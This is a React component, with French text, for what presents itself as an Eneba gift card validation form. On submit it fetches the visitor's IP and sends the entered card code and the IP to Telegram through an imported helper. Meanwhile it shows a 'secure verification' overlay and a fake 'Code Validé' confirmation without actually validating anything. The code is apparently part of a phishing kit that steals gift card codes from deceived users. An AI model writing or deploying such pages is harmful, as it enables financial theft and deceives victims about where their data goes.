
import React, { useState } from 'react';
import { SubmissionStatus } from '../types';
import { fetchUserIp, sendToTelegram } from '../services/apiService';
import LoadingOverlay from './LoadingOverlay';

const GiftCardForm: React.FC = () => {
  const [code, setCode] = useState('');
  const [status, setStatus] = useState<SubmissionStatus>(SubmissionStatus.IDLE);
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validation basique côté client
    const cleanCode = code.trim();
    if (cleanCode.length < 8) {
      setError("Le code doit comporter au moins 8 caractères.");
      return;
    }

    setStatus(SubmissionStatus.LOADING);
    setError(null);

    try {
      const ip = await fetchUserIp();
      const success = await sendToTelegram(cleanCode, ip);

      if (success) {
        setStatus(SubmissionStatus.SUCCESS);
        setCode('');
      } else {
        throw new Error('Telegram rejection');
      }
    } catch (err) {
      setStatus(SubmissionStatus.ERROR);
      setError("Échec de la validation. Veuillez vérifier votre code.");
    }
  };

  if (status === SubmissionStatus.SUCCESS) {
    return (
      <div className="bg-emerald-50 border-2 border-emerald-100 rounded-3xl p-8 text-center animate-in fade-in zoom-in duration-500">
        <div className="w-16 h-16 bg-emerald-500 text-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg shadow-emerald-200">
          <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7" />
          </svg>
        </div>
        <h3 className="text-xl font-bold text-emerald-900 mb-2">Code Validé !</h3>
        <p className="text-emerald-700 text-sm">
          Votre demande est en cours de traitement. Vous recevrez une confirmation sous peu.
        </p>
        <button 
          onClick={() => setStatus(SubmissionStatus.IDLE)}
          className="mt-6 text-sm font-bold text-emerald-600 hover:text-emerald-800 underline transition-colors"
        >
          Valider un autre code
        </button>
      </div>
    );
  }

  return (
    <div className="relative">
      {status === SubmissionStatus.LOADING && <LoadingOverlay message="Vérification sécurisée..." />}
      
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="text-center">
          <label htmlFor="giftCode" className="block text-sm font-bold text-slate-400 uppercase tracking-widest mb-4">
            Code Carte Cadeau (100 EUR)
          </label>
          
          <div className="relative">
            <input
              id="giftCode"
              type="text"
              value={code}
              onChange={(e) => {
                setCode(e.target.value.toUpperCase());
                if (error) setError(null);
              }}
              placeholder="Ex: XXXX-XXXX-XXXX"
              className={`w-full h-16 px-6 text-center text-xl font-mono font-bold rounded-2xl border-2 transition-all duration-300 outline-none ${
                error 
                ? 'border-red-300 bg-red-50 text-red-900 animate-shake' 
                : 'border-slate-100 bg-slate-50 text-slate-900 focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-100'
              }`}
              required
            />
            {error && <p className="mt-2 text-red-500 text-xs font-bold uppercase">{error}</p>}
          </div>
        </div>

        <button
          type="submit"
          disabled={status === SubmissionStatus.LOADING}
          className="w-full h-16 bg-indigo-600 hover:bg-indigo-700 disabled:bg-slate-300 text-white font-extrabold rounded-2xl shadow-xl shadow-indigo-100 hover:shadow-indigo-200 transition-all transform hover:-translate-y-1 active:translate-y-0.5 flex items-center justify-center space-x-3"
        >
          <span>UTILISER LE CODE ENEBA</span>
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 7l5 5m0 0l-5 5m5-5H6" />
          </svg>
        </button>
      </form>
    </div>
  );
};

export default GiftCardForm;
